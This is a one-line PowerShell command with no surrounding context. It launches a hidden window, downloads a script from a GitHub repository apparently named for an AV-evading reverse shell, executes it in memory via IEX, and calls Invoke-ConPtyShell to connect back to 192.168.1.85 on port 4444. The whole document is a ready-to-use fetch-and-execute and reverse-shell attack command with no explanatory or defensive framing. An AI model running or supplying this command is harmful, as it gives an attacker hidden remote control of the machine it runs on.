powershell -NoProfile -WindowStyle Hidden -Command "IEX (IWR 'https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/reverse.ps1' -UseBasicParsing); Invoke-ConPtyShell '192.168.1.85' '4444'"
